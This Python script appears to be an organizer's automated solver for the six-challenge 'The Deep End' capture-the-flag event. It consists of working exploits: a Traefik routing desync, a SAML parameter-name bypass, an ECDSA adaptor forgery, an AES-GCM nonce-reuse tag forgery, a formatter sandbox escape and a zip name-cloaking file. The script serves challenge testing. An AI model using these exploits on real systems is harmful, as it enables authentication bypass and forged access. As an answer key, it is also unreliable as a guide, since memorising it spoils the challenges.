#!/usr/bin/env python3
"""
The Deep End — automated solver / organizer self-check.
Runs all 6 research-grade exploits against the challenges by service name.
Needs `ecdsa` (for c3); everything else is stdlib. Exits 0 iff all 6 land.
"""
import sys, re, json, socket, struct, zlib, hashlib, secrets, base64, urllib.request, urllib.parse, urllib.error

def http(url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        return urllib.request.urlopen(req, timeout=12).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")
    except Exception as e:
        return f"ERR:{e}"

def mf(t): m = re.search(r"0DAY\{[^}]*\}", t or ""); return m.group(0) if m else None
R = {}

# ---- c1: Traefik URL.Opaque routing/forwarding desync (raw opaque target) ---
try:
    s = socket.create_connection(("c1", 80), timeout=8)
    s.sendall(b"GET http:admin/flag HTTP/1.1\r\nHost: c1\r\nConnection: close\r\n\r\n")
    s.settimeout(5); buf = b""
    while True:
        d = s.recv(4096)
        if not d: break
        buf += d
    s.close(); R[1] = mf(buf.decode("latin1"))
except Exception:
    R[1] = None

# ---- c2: SAML redirect percent-encoded parameter-name differential ----------
assertion = ('<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
             '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
             '<saml:Subject><saml:NameID>admin@deepend.local</saml:NameID></saml:Subject>'
             '</saml:Assertion></samlp:Response>')
b64a = urllib.parse.quote(base64.b64encode(assertion.encode()).decode(), safe="")
R[2] = mf(http("http://c2/saml/acs?%53AMLResponse=" + b64a))   # encoded name, unsigned

# ---- c3: ECDSA adaptor-signature existential forgery (public key only) ------
try:
    from ecdsa import SECP256k1
    from ecdsa.ellipticcurve import Point
    G, N, CURVE = SECP256k1.generator, SECP256k1.order, SECP256k1.curve
    pr = json.loads(http("http://c3/params"))
    P = Point(CURVE, int(pr["P"][0]), int(pr["P"][1]), N); target = pr["target"]
    Hm = int.from_bytes(hashlib.sha256(target.encode()).digest(), "big") % N
    a = secrets.randbelow(N - 1) + 1; KY = a * G; r = KY.x() % N; s_hat = 1
    K = (Hm % N) * G + r * P
    body = {"m": target, "K": [str(K.x()), str(K.y())], "K_Y": [str(KY.x()), str(KY.y())],
            "r": str(r), "s_hat": str(s_hat)}
    R[3] = mf(http("http://c3/presign/verify", data=json.dumps(body).encode(),
                   headers={"Content-Type": "application/json"}))
except Exception as e:
    R[3] = None

# ---- c4: AES-GCM nonce-reuse forbidden attack (recover H, forge tag) --------
Rpoly = 0xe1 << 120
def gf_mul(x, y):
    xi = int.from_bytes(x, "big"); yi = int.from_bytes(y, "big"); z = 0; v = xi
    for i in range(128):
        if (yi >> (127 - i)) & 1: z ^= v
        v = (v >> 1) ^ Rpoly if (v & 1) else (v >> 1)
    return z.to_bytes(16, "big")
def gf_xor(a, b): return bytes(i ^ j for i, j in zip(a, b))
def gf_pow(a, e):
    r = (1 << 127).to_bytes(16, "big")
    while e:
        if e & 1: r = gf_mul(r, a)
        a = gf_mul(a, a); e >>= 1
    return r
def gf_inv(a): return gf_pow(a, (1 << 128) - 2)
def gf_sqrt(a): return gf_pow(a, 1 << 127)
try:
    p1, p2 = b"A" * 16, b"B" * 16
    e1 = json.loads(http("http://c4/encrypt?msg=" + urllib.parse.quote(p1.decode())))
    e2 = json.loads(http("http://c4/encrypt?msg=" + urllib.parse.quote(p2.decode())))
    c1, t1 = bytes.fromhex(e1["ct"]), bytes.fromhex(e1["tag"])
    c2, t2 = bytes.fromhex(e2["ct"]), bytes.fromhex(e2["tag"])
    ks = gf_xor(p1, c1)
    L = (b"\x00" * 8) + (128).to_bytes(8, "big")
    H2 = gf_mul(gf_xor(t1, t2), gf_inv(gf_xor(c1, c2)))
    H = gf_sqrt(H2)
    S = gf_xor(t1, gf_xor(gf_mul(c1, H2), gf_mul(L, H)))
    TARGET = b"GIVE-ME-ADMIN!!!"
    cts = gf_xor(TARGET, ks)
    Ts = gf_xor(gf_xor(gf_mul(cts, H2), gf_mul(L, H)), S)
    R[4] = mf(http("http://c4/command", data=json.dumps({"ct": cts.hex(), "tag": Ts.hex()}).encode(),
                   headers={"Content-Type": "application/json"}))
except Exception:
    R[4] = None

# ---- c5: Formatter field-resolution sandbox escape -> module globals --------
R[5] = mf(http("http://c5/render", data=b"{ctx.__class__.__init__.__globals__[FLAG]}"))

# ---- c6: Rust zip2 "zip cloaking" (CD name != LFH name) ---------------------
def make_zip(cd, lfh, data=b"yes"):
    crc = zlib.crc32(data) & 0xffffffff
    l = b"PK\x03\x04" + struct.pack("<HHHHHIIIHH", 20, 0, 0, 0, 0, crc, len(data), len(data), len(lfh), 0) + lfh + data
    c = b"PK\x01\x02" + struct.pack("<HHHHHHIIIHHHHHII", 20, 20, 0, 0, 0, 0, crc, len(data), len(data), len(cd), 0, 0, 0, 0, 0, 0) + cd
    e = b"PK\x05\x06" + struct.pack("<HHHHIIH", 0, 0, 1, 1, len(c), len(l), 0)
    return l + c + e
R[6] = mf(http("http://c6/deploy", data=make_zip(b"bundle.json", b"data/unlocked"),
               headers={"Content-Type": "application/zip"}))

NAMES = {1: "Traefik URL.Opaque desync", 2: "SAML %-name differential",
         3: "ECDSA adaptor forgery", 4: "AES-GCM forbidden attack",
         5: "Formatter sandbox escape", 6: "zip2 cloaking"}
print("== The Deep End — solver ==")
for i in range(1, 7):
    print(f"  c{i} {NAMES[i]:<28} {R.get(i) or '<missing>'}")
ok = all((R.get(i) or "").startswith("0DAY{") for i in range(1, 7))
print("\nRESULT:", "ALL 6 FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
